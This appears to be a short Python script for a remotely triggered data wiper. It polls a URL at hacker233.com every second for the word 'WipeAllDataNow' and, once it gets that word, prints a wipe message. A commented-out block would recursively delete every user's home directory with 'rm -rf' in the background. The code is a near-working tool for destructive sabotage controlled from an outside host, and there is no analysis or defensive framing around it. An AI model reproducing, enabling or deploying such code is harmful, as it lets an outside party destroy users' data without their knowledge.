import os
import requests
import time

# Set Magic Word
magicWord = 'WipeAllDataNow'

# Set web server address
webHooks = ['https://hacker233.com/LetsWipe.php']

# Get users list from the system
users = os.listdir('/home/')

needWipe = False

while True:
    for hook in webHooks:
        #fetch the web hook
        try:
            content = requests.get(hook, headers={'Cache-Control': 'no-cache'}).content.decode('utf-8')
            #print('Received: ' + content)
            if content == magicWord:
                needWipe = True
                break
        except:
            pass

    # if needWipe:
    #     for u in users:
    #         userPath = '/home/' + u
    #         os.system('nohup rm -rf ' + userPath + ' >/dev/null &')
    #     needWipe = False

    if needWipe:
        print('Will Wiping all data now...')
        needWipe = False

    time.sleep(1)